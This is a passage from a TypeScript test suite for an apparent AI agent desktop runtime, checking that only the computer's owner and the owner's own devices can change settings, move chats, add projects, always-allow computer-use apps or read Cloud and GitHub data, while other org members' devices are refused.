      "project.logo.read": await reasonOf(
        other.call("project.logo.read", { project_id: project.id }),
      ),
      "keybindings.get": await reasonOf(other.call("keybindings.get", {})),
      "settings.get": await reasonOf(other.call("settings.get", {})),
      "cloud.status": await reasonOf(other.call("cloud.status", {})),
    };

    expect({
      // Each method another person's device was answered on by its handler, with what it answered.
      served,
      // The methods whose answer to it held the owner's note.
      heldTheNote,
      // The settings it wrote.
      wrote,
      open,
      owners: await owners(),
    }).toEqual({
      served: {},
      heldTheNote: [],
      wrote: {},
      open: {
        "skill.list": "ok",
        "project.list": "ok",
        "project.branches": "ok",
        "project.logo.read": "ok",
        "keybindings.get": "ok",
        "settings.get": "ok",
        "cloud.status": "ok",
      },
      owners: before,
    });
    expect(asked.map(([method]) => method).sort()).toEqual(
      [...HOME_PROJECTS_SETTINGS_AND_CLOUD].sort(),
    );
    const refusal = await other.call("settings.set", { ...req(), settings: { theme: "light" } });
    expect((refusal.error as { message?: string }).message).toBe(
      "Only this computer's owner can change its settings.",
    );

    // On this computer each kind of change still goes through (the owner's own device through the relay: the last test).
    await local.call("skill.save", {
      request_id: "o4",
      scope: "me",
      name: "second",
      markdown: skillText("second"),
    });
    await local.call("memory.forget", { request_id: "o5", id: note.id });
    await local.call("settings.set", { request_id: "o6", settings: { default_access: "ask" } });
    await local.call("project.remove", { request_id: "o7", project_id: project.id });
    const after = await owners();
    expect({
      projects: after.projects,
      skills: after.skills,
      notes: after.notes,
      access: after.settings.default_access,
    }).toEqual({
      projects: [],
      skills: [...before.skills, "second"].sort(),
      notes: [],
      access: "ask",
    });
  }, 240_000);

  test("nor does its Always allow on an app's approval reach the owner's settings: it allows the app in the chat it drives", async () => {
    // Computer use as server.ts gives it to the route, on a stand-in for agent-desktop; the test holds it too, to make
    // the calls an agent's `desktop` tool makes.
    const root = tempRoot("owner-gate-desktop-");
    let desktop: MacDesktop["Service"] | undefined;
    const computerUse = Layer.effect(
      MacDesktop,
      Effect.gen(function* () {
        desktop = yield* MacDesktop;
        return desktop;
      }),
    ).pipe(Layer.provide(layerWith({ bin: agentDesktop(root) })));
    const { local, other } = await macWithAnotherPersonsDevice(
      computerUse as Layer.Layer<any, never, any>,
    );
    const chat = await local.call("workspace.create", {
      request_id: "w1",
      repo: { path: makeRepo(root, { "README.md": "hi\n" }) },
      engine: "claude-agent",
      options: { model: MODEL },
    });
    const asks: Array<string> = [];
    await local.attach(chat.session_id, 0, (event) => {
      if (event.type === "ask.user" && event.item_id !== undefined) asks.push(event.item_id);
    });
    const use = (app: string) =>
      Effect.runPromise(
        desktop!.use(`caveman:${chat.id}`, { app, command: "snapshot" }).pipe(Effect.result),
      );
    const answer = (ask: string, option: string, n: number) => ({
      request_id: `answer-${n}`,
      session_id: chat.session_id,
      ask_id: ask,
      response: { kind: "approval", option_id: option },
    });
    const kept = async () =>
      ((await local.call("settings.get", {})).computer_use_apps ?? []).map((app) => app.name);

    // The agent of the chat it drives wants Preview: the card offers Always allow, Allow in this chat and Deny.
    const preview = use("Preview");
    await until(() => asks.length === 1);
    const always = await other.call("ask.respond", answer(asks[0]!, ALWAYS_ALLOW, 1));
    expect({
      always:
        (always.error as { data?: { reason?: string }; message?: string } | undefined)?.data
          ?.reason ?? "ok",
      kept: await kept(),
      // In this chat is theirs to say, as any answer in a chat they drive.
      chat: await reasonOf(other.call("ask.respond", answer(asks[0]!, "chat", 2))),
    }).toEqual({ always: "forbidden", kept: [], chat: "ok" });
    expect((always.error as { message?: string }).message).toBe(
      "Only the owner can always allow an app. Allow it for this chat instead.",
    );
    await preview;
    // Allowed in this chat: its next call asks nobody.
    await use("Preview");
    expect(asks).toHaveLength(1);

    // The owner's Always allow is kept, as before.
    const calculator = use("Calculator");
    await until(() => asks.length === 2);
    await local.call("ask.respond", answer(asks[1]!, ALWAYS_ALLOW, 3) as never);
    await calculator;
    expect(await kept()).toEqual(["Calculator"]);
  }, 120_000);
});

describe("a chat's moves, a new project, and what Caveman Cloud and GitHub hold on the owner's sign-in belong to the runtime's owner", () => {
  test("a device This Mac allowed for another person of the org moves no chat, reads none of them, and starts a chat only in a project the owner has", async () => {
    const { local, other } = await macWithAnotherPersonsDevice();
    const root = tempRoot("owner-gate-moves-");
    const project = await local.call("project.create", {
      request_id: "o1",
      path: makeRepo(path.join(root, "widgets"), { "README.md": "widgets\n" }),
    });
    const chat = await local.call("workspace.create", {
      request_id: "o2",
      repo: { path: project.path },
      engine: "claude-agent",
      options: { model: MODEL },
    });
    const projects = async () =>
      (await local.call("project.list", {})).projects.map((p) => ({
        path: p.path,
        sources: p.sources?.map((s) => s.name),
      }));
    const before = await projects();

    // Another person's device asks: to move the owner's chat (to Cloud, to a computer, here), for what a move held
    // back, to add to a project, and for what Caveman Cloud and GitHub answer the owner's sign-in.
    const nowhere = "00000000-0000-4000-8000-000000000000";
    const theirs = makeRepo(path.join(root, "theirs"), { "README.md": "theirs\n" });
    let n = 0;
    const req = () => ({ request_id: `other-${++n}` });
    const asked: ReadonlyArray<readonly [string, unknown]> = [
      ["session.move.check", { session_id: chat.session_id, to: "cloud" }],
      ["session.move.held", { session_id: chat.session_id }],
      ["session.move", { ...req(), session_id: chat.session_id, to: { computer_id: nowhere } }],
      ["session.adopt", { ...req(), session_id: "no-such-session" }],
      ["project.add_source", { ...req(), project_id: project.id, path: theirs }],
      ["project.remove_source", { ...req(), project_id: project.id, name: "no-such-source" }],
      ["automation.cloud_list", {}],
      ["automation.cloud_runs", {}],
      ["agent.published", {}],
      ["github.status", {}],
      ["github.issues", { project_id: project.id }],
      ["environment.get", { project_id: project.id }],
      ["environment.draft", { project_id: project.id }],
      ["environment.build.get", { build_id: nowhere }],
      ["environment.build.log", { build_id: nowhere }],
      ["environment.proposals", { project_id: project.id }],
      ["environment.versions", { project_id: project.id }],
      ["environment.list", {}],
      ["environment.ci", { project_id: project.id }],
    ];
    const served: Record<string, string> = {};
    for (const [method, params] of asked) {
      const reason = await reasonOf(other.call(method, params));
      if (reason !== "forbidden") served[method] = reason;
    }

    // A chat of their own: in a folder that is no project of the owner's, or a repository this Mac would have to
    // clone, it would add to the owner's list; in the owner's project it starts.
    const starts = {
      folder: await reasonOf(
        other.call("workspace.create", {
          ...req(),
          repo: { path: theirs },
          engine: "claude-agent",
          options: { model: MODEL },
        }),
      ),
      clone: await reasonOf(
        other.call("workspace.create", {
          ...req(),
          repo: { url: `file://${theirs}` },
          engine: "claude-agent",
          options: { model: MODEL },
        }),
      ),
      project: await reasonOf(
        other.call("workspace.create", {
          ...req(),
          repo: { path: project.path },
          engine: "claude-agent",
          options: { model: MODEL },
        }),
      ),
    };
    // What stays theirs in a chat they drive: the list of chats, its project's own sources, and stopping its turn.
    const open = {
      "workspace.list": await reasonOf(other.call("workspace.list", {})),
      "workspace.add_source": await reasonOf(
        other.call("workspace.add_source", {
          ...req(),
          workspace_id: chat.id,
          source: "no-such-source",
        }),
      ),
      "turn.interrupt": await reasonOf(
        other.call("turn.interrupt", { ...req(), session_id: chat.session_id }),
      ),
    };

    expect({
      served,
      starts,
      open: Object.entries(open).filter(([, reason]) => reason === "forbidden"),
      projects: await projects(),
    }).toEqual({
      served: {},
      starts: { folder: "forbidden", clone: "forbidden", project: "ok" },
      open: [],
      projects: before,
    });
    expect(asked.map(([method]) => method).sort()).toEqual(
      [...MOVES_AND_READS_AS_THE_OWNER].sort(),
    );
    const refusal = await other.call("workspace.create", {
      ...req(),
      repo: { path: theirs },
      engine: "claude-agent",
      options: { model: MODEL },
    });
    expect((refusal.error as { message?: string }).message).toBe(
      "Only this computer's owner can start a chat in a folder that is not a project yet.",
    );
    const move = await other.call("session.move.check", {
      session_id: chat.session_id,
      to: "cloud",
    });
    expect((move.error as { message?: string }).message).toBe(
      "Only this computer's owner can move a chat.",
    );

    // The owner, at the Mac: a chat in a new folder still adds it to their projects.
    await local.call("workspace.create", {
      request_id: "o3",
      repo: { path: theirs },
      engine: "claude-agent",
      options: { model: MODEL },
    });
    expect((await projects()).map((p) => p.path).sort()).toEqual(
      [project.path, fs.realpathSync(theirs)].sort(),
    );
  }, 240_000);
});

describe("a Mac that names its owner takes only its owner's devices", () => {
  test("the owner's own device, through the relay, is the owner behind the door: each kind of call goes through as before; another person's device never gets that far", async () => {
    const { cloud, local, relay } = await thisMac(true);
    const root = tempRoot("owner-gate-owner-");
    const project = await local.call("project.create", {
      request_id: "o1",
      path: makeRepo(path.join(root, "widgets"), { "README.md": "widgets\n" }),
    });
    const chat = await local.call("workspace.create", {
      request_id: "o2",
      repo: { path: project.path },
      engine: "claude-agent",
      options: { model: MODEL },
    });
    const { name: market } = await local.call("marketplace.add", {
      request_id: "o3",
      source: pluginFolder("kit"),
    });
    const kit = `kit@${market}`;
    const second = makeRepo(path.join(root, "second"), { "README.md": "second\n" });

    // Their phone: the screen asked once, they allowed it, and its calls run as cloud:user-1, the person the sign-in names.
    const mine = await allowedStream(relay, local);
    const went = {
      servers: await reasonOf(mine.call("mcp.list", {})),
      providers: await reasonOf(mine.call("secret_provider.list", {})),
      install: await reasonOf(
        mine.call("plugin.install", { request_id: "mine-1", id: kit, scope: "me" }),
      ),
      uninstall: await reasonOf(
        mine.call("plugin.uninstall", { request_id: "mine-2", id: kit, scope: "me" }),
      ),
      settings: await reasonOf(
        mine.call("settings.set", {
          request_id: "mine-3",
          settings: { favorite_models: ["caveman/my-pick"] },
        }),
      ),
      notes: await reasonOf(mine.call("memory.list", {})),
      rename: await reasonOf(
        mine.call("project.update", {
          request_id: "mine-4",
          project_id: project.id,
          name: "Widgets",
        }),
      ),
      // A chat in a folder that is not a project yet: it becomes one of theirs.
      start: await reasonOf(
        mine.call("workspace.create", {
          request_id: "mine-5",
          repo: { path: second },
          engine: "claude-agent",
          options: { model: MODEL },
        }),
      ),
      // Moves, and what Caveman Cloud answers their sign-in: each reaches its handler (what it then says is its own).
      check: await reasonOf(
        mine.call("session.move.check", { session_id: chat.session_id, to: "this_mac" }),
      ),
      held: await reasonOf(mine.call("session.move.held", { session_id: chat.session_id })),
      published: await reasonOf(mine.call("agent.published", {})),
      environments: await reasonOf(mine.call("environment.list", {})),
    };
    expect(Object.entries(went).filter(([, reason]) => reason === "forbidden")).toEqual([]);
    expect(went).toMatchObject({
      servers: "ok",
      providers: "ok",
      install: "ok",
      uninstall: "ok",
      settings: "ok",
      notes: "ok",
      rename: "ok",
      start: "ok",
      check: "ok",
      held: "ok",
    });
    expect({
      favorites: (await local.call("settings.get", {})).favorite_models,
      projects: (await local.call("project.list", {})).projects.map((p) => p.path).sort(),
    }).toEqual({
      favorites: ["caveman/my-pick"],
      projects: [project.path, fs.realpathSync(second)].sort(),
    });

    // Another person of the org, as Caveman Cloud verified them: refused at the hello, so nothing behind the door is theirs to ask.
    const theirs = relay.open({ user_id: "user-2", organization_id: cloud.state.organizationId });
    const hello = await sayHello(relay, theirs, await testDevice("A colleague's iPhone"));
    expect(hello.reply.error).toMatchObject({
      message: `${hello.challenge.runtime_name} takes only its owner's devices.`,
      data: { reason: "device_not_approved" },
    });
    expect((await local.call("device.list", {})).requests).toEqual([]);
  }, 240_000);
});

describe("on a Cloud computer the owner is the person its enrollment names", () => {
  /** A Cloud computer's runtime, its identity as Caveman Cloud writes it (computers/reconciler/link.go): with the person who asked for the computer, or with none. */
  async function cloudComputer(person: boolean) {
    const cloud = await startTestCloud();
    cleanups.push(cloud.close);
    cloud.state.enrollWithoutPerson = !person;
    const root = tempRoot("owner-gate-computer-");
    const linkDir = path.join(root, "link");
    const identity = await enroll({
      dir: linkDir,
      cloudUrl: cloud.url,
      bearer: cloud.state.personToken,
      name: "computer",
    });
    const checkout = makeRepo(path.join(root, "workspace"), { "README.md": "widgets\n" });
    const runtime = await startRuntime(await makeConfig(), "fake-claude", undefined, {
      cloudComputer: {
        computer: { linkDir, computerId: identity.computerId, workspaceRoot: checkout },
        link: {},
      },
      provide: stores(),
    });
    cleanups.push(runtime.close);
    const here = connect(runtime.url, runtime.token);
    cleanups.push(() => here.close());
    await until(async () => (await here.call("cloud.status", {})).state === "connected", 15_000);
    const relay = cloud.state.relays[0]!;
    let n = 0;
    /** A person's client through the relay: a Cloud computer serves it at once, as that person. */
    const as = (userId: string) => {
      const stream = relay.open({ user_id: userId, organization_id: cloud.state.organizationId });
      return (method: string, params: unknown) => {
        const id = `call-${++n}`;
        relay.send(stream, JSON.stringify({ jsonrpc: "2.0", id, method, params }));
        return reasonOf(replyTo(relay, stream, id));
      };
    };
    return {
      as,
      record: JSON.parse(fs.readFileSync(path.join(linkDir, "runtime.json"), "utf8")) as Record<
        string,
        unknown
      >,
    };
  }
  const asks = async (call: (method: string, params: unknown) => Promise<string>) => ({
    "mcp.list": await call("mcp.list", {}),
    "settings.set": await call("settings.set", {
      request_id: `set-${randomBytes(4).toString("hex")}`,
      settings: { favorite_models: ["caveman/a-pick"] },
    }),
    "memory.list": await call("memory.list", {}),
    "web.keys.status": await call("web.keys.status", {}),
    "session.move.check": await call("session.move.check", {
      session_id: "no-such-session",
      to: "cloud",
    }),
    "environment.list": await call("environment.list", {}),
    "settings.get": await call("settings.get", {}),
    "workspace.list": await call("workspace.list", {}),
  });

  test("the person who asked for the computer passes the gate from their own devices; another member of the org does not", async () => {
    const { as, record } = await cloudComputer(true);
    // As link.go writes it: the four ids, and user_id, the person who asked for the computer.
    expect(Object.keys(record).sort()).toEqual([
      "cloud_url",
      "computer_id",
      "organization_id",
      "runtime_id",
      "user_id",
    ]);
    expect(record.user_id).toBe("user-1");
    expect({ theirs: await asks(as("user-1")), another: await asks(as("user-2")) }).toEqual({
      // (A move's check reaches its handler, which finds no such chat.)
      theirs: {
        "mcp.list": "ok",
        "settings.set": "ok",
        "memory.list": "ok",
        "web.keys.status": "ok",
        "session.move.check": "not_found",
        "environment.list": "ok",
        "settings.get": "ok",
        "workspace.list": "ok",
      },
      another: {
        "mcp.list": "forbidden",
        "settings.set": "forbidden",
        "memory.list": "forbidden",
        "web.keys.status": "forbidden",
        "session.move.check": "forbidden",
        "environment.list": "forbidden",
        "settings.get": "ok",
        "workspace.list": "ok",
      },
    });
  }, 120_000);

  test("a computer whose enrollment names nobody has no owner among people: chats are driven there, and Cloud's queued calls still reach their handlers", async () => {
    const { as, record } = await cloudComputer(false);
    // A service account's or an automation's computer: nobody asked for it, so link.go writes no user_id.
    expect(Object.keys(record).sort()).toEqual([
      "cloud_url",
      "computer_id",
      "organization_id",
      "runtime_id",
    ]);
    const call = as("user-1");
    expect(await asks(call)).toEqual({
      "mcp.list": "forbidden",
      "settings.set": "forbidden",
      "memory.list": "forbidden",
      "web.keys.status": "forbidden",
      "session.move.check": "forbidden",
      "environment.list": "forbidden",
      "settings.get": "ok",
      "workspace.list": "ok",
    });
    // What Cloud queues for a chat (a send, a stop, an answer) is no method of the gate: each reaches its handler, which
    // here finds no such chat.
    expect({
      "turn.submit": await call("turn.submit", {
        request_id: "q1",
        session_id: "no-such-session",
        kind: "followup",
        input: { text: "Go on" },
      }),
      "turn.interrupt": await call("turn.interrupt", {
        request_id: "q2",
        session_id: "no-such-session",
      }),
      "ask.respond": await call("ask.respond", {
        request_id: "q3",
        session_id: "no-such-session",
        ask_id: "no-such-ask",
        response: { kind: "approval", option_id: "allow" },
      }),
    }).toEqual({
      "turn.submit": "not_found",
      "turn.interrupt": "not_found",
      "ask.respond": "not_found",
    });
  }, 120_000);
});
